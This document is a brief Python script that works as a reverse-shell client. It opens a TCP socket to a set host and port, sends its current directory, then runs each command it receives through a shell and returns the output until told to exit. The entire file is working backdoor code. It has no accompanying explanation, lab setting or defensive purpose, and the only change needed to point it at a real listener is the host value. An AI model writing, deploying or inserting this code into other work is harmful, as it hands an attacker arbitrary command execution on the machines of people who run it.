import subprocess
from sys import *
from socket  import *
import os

port  = 10000
host = '127.0.0.1'

BUF_SIZE =1024
s = socket(AF_INET,SOCK_STREAM)
s.connect((host,port))
pwd = os.getcwd()
s.send(pwd.encode('utf-8'))

while(1) :
     cmd = s.recv(BUF_SIZE).decode('utf-8')
     if (cmd == 'exit') :
          break
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE,shell=True)
     out, err =proc.communicate()
     if out :
          s.send(out)
     elif err :
         s.send(err)
     else:
          s.send(("<<Successfully Complete>>").encode('utf-8'))
s.close()
